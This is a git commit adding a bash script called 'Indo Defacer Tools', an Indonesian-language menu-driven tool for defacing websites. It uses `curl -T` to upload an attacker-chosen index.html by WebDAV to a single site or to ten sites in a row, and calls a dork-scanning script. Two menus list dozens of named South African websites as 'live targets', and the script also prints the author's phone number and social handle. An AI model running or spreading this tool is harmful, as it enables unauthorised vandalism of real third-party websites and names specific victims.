911e24e3f3cd73ee6fc8ced1241fff60803ce516
Ragilf <52344423+Ragilf@users.noreply.github.com>
2019-07-02 18:50:59 +0700

    Deface

---
+++ DFC.sh
@@ -0,0 +1,261 @@
+#MR D4PLUN
+#NO RECODE
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+bash jr.sh;
+
+clear
+echo
+echo
+echo
+echo
+echo
+echo
+echo
+echo $green"--------------------------------------------------"
+echo  "                INDO DEFACER TOOLS "
+echo
+echo $red"-------------------$green"   WELCOME "$red---------------------"
+echo "         Author     :  MR D4PLU17 AND MR CAO "
+echo "         IG         :  febryan_ragil"
+echo "         Thanks to  :  ICES "
+echo $red"-----------------------$green"    TO  "$red-----------------------"
+echo $green" TRIMAKASIH YG TELAH MENGGUNAKAN TOOLS INI"
+echo $green" SEMOGA BERMANFAAT DAN BACA DOA TERLEBIH DAHULU"
+echo $red"-------------------$green" CYBERSPACE "$red-------------------"
+echo
+echo $indigo"	~"$cyan"{"$white"A"$cyan"}"$green"."$green"Tebas Index"$cyan
+echo $indigo"        ~"$cyan"{"$white"B"$cyan"}"$green"."$green"Scaning Dork Web Vuln"$cyan
+echo $indigo"	~"$cyan"{"$white"C"$cyan"}"$green"."$green"Auto Deface / Webdav"$cyan
+echo
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo
+echo $indigo"  +"$cyan"{"$white"T"$cyan"}"$purple"."$green"LIVE TARGET"$indigo"      +"$cyan"{"$white"I"$cyan"}"$green"Info"$indigo"      +"$cyan"{"$white"Q"$cyan"}"$green"Quit"$cyan
+echo $cyan"＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿＿"
+echo $indigo"================================================="
+echo
+echo $white "╭─"$yellow"Anonymous"$cyan" ~MR.D4PLU17"$white
+read -p " ╰─$ "  apaan
+echo
+if [ $apaan = "A" ] || [ $apaan = "a" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo
+echo          "Deface Tebas Index"
+echo
+echo $red "Simpan SC Di Memory Internal Di Luar Folder "
+echo
+echo $yellow "Live Target"
+echo $white "http://officeelf.co.za"
+echo $cyan "http://mix007.co.za"
+echo $white "http://sportspod.co.za"
+echo $cyan "http://tapifare.com"
+echo $white "http://trafficam.co.za"
+echo $cyan "http://everythingdating.co.za"
+echo $white "http://findpersonnel.co.za"
+echo $cyan "http://cmweb.co.za"
+echo $white "http://lunique.co.za"
+echo $cyan "http://chasingfantasia.co.za"
+echo $white "http://gordonhoward.co.za"
+echo $cyan "http://ittrader.co.za"
+echo $white "http://gogreenplumbing.co.za"
+echo $cyan"http://clcooling.co.za"
+echo $white "http://disucctv.co.za"
+echo $cyan"http://elinemsa.co.za"
+echo $white "http://scnc.co.za"
+echo $cyan "http://ayk.co.za"
+echo
+echo
+echo $red "Masukkan Web Target!!!"
+echo $green "╭─"$blue"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white
+read -p " ╰─$ "  target
+echo
+echo $red "Masukan Script!!! "
+echo $green "╭─"$blue"Anonymous Indonesia"$cyan" ~/Nama SC Kalian ya harus (index.html) "$white
+read -p " ╰─$ "  script
+curl -T /storage/emulated/0/$script $target
+echo $red "["$yellow"Hacked"$red"]"$cyan"～～～＞"$green" $target"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "B" ] || [ $apaan = "b" ]
+then
+python2 B-DORK.py
+echo 
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "C" ] || [ $apaan = "c" ]
+then
+echo
+echo
+echo
+clear
+echo
+echo
+echo
+echo $red
+echo        "Auto Deface 10"
+echo $cyan "Deface Masal Sebanyak 10 Web"
+echo
+echo $red"###"$blue" Ctrl + C To Quit"$red" ###"
+echo
+echo
+echo
+echo "Masukan Script !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " script
+echo
+echo
+echo $white"Masukan Target1 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target1
+curl -T /storage/emulated/0/$script $target1
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target1/$script"
+echo
+echo $white"Masukan Target2 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target2
+curl -T /storage/emulated/0/$script $target2
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target2/$script"
+echo
+echo $white"Masukan Target3 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target3
+curl -T /storage/emulated/0/$script $target3
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target3/$script"
+echo
+echo $white"Masukan Target4 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target4
+curl -T /storage/emulated/0/$script $target4
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target4/$script"
+echo
+echo $white"Masukan Target5 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target5
+curl -T /storage/emulated/0/$script $target5
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target5/$script"
+echo
+echo $white"Masukan Target6 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target6
+curl -T /storage/emulated/0/$script $target6
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target6/$script"
+echo
+echo $white"Masukan Target7 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target7
+curl -T /storage/emulated/0/$script $target7
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target7/$script"
+echo
+echo $white"Masukan Target8 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target8
+curl -T /storage/emulated/0/$script $target8
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target8/$script"
+echo
+echo $white"Masukan Target9 !!!!"
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target9
+curl -T /storage/emulated/0/$script $target9
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target9/$script"
+echo
+echo $white"Masukan Target10 !!!! "
+echo $white "╭─"$green"Anonymous Indonesia"$cyan" ~MR.D4PLU17"$white                               
+read -p " ╰─$ " target10
+curl -T /storage/emulated/0/$script $target10
+echo $cyan"["$green"+"$cyan"]"$red"==="$white"＞"$green"$target10/$script"
+echo
+echo
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] : " back
+fi
+
+if [ $apaan = "I" ] || [ $apaan = "i" ]
+then
+echo
+echo $indigo"---------------------------------------------------------------"
+echo         "   Informasi Tools"
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $green"Author  : MR D4PLU17	"
+echo
+echo $yellow"                          THANKS TO :"
+echo
+echo $cyan"[+] Anonymous Indonesia "
+echo $cyan"[+] All Member ICES "
+echo $cyan"[+] MR D4PLU17 "
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $indigo"------------------------------------------------------------"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "T" ] || [ $apaan = "t" ]
+then
+echo
+echo
+echo
+echo $red"------------------------------------------------------------"
+echo               "< Live Target> "
+echo $red"##########################$green" WELCOME "$red###########################"
+echo $white"http://floralandfresh.co.za/"
+echo $cyan "http://scnc.co.za/"
+echo $white"http://contsol.co.za"
+echo $cyan "http://consultec.co.za"
+echo $white"http://ayk.co.za"
+echo $cyan "http://daretogowildafrica.co.za"
+echo $white"http://foodconsult.co.za"
+echo $cyan "http://hanover-cs.co.za"
+echo $white"http://lubbestrust.co.za"
+echo $cyan "http://lpenterprises.co.za"
+echo $white"http://butterflowers.co.za"
+echo $cyan" http://bee-it.co.za"
+echo $white"http://africa-one.co.za"
+echo $cyan "http://mpark.co.za"
+echo $white"http://ads247.co.za"
+echo $cyan" http://8x8.co.za"
+echo $white"http://aaglcapetown2013.org.za"
+echo $cyan "http://page31.co.za"
+echo $red"##########################$green"WEB VULN "$red###########################"
+echo
+echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
+read -p "[B/Q] " back
+fi
+
+if [ $apaan = "Q" ] || [ $apaan = "q" ]
+then
+echo $green " Thanks Ya, Jangan Lupa Balik Lagi :) "
+echo $green " Jika Ada Kesalahan Hubungi Admin"
+echo $green " NO : 081353739702"
+echo $green " IG : febryan_ragil"
+exit
+clear
+fi
+
+
+if [ $back = "B" ] || [ $back = "b" ]
+then
+sh BCA.sh
+fi
+
+if [ $back = "Q" ] || [ $back = "q" ]
+then
+clear
+fi
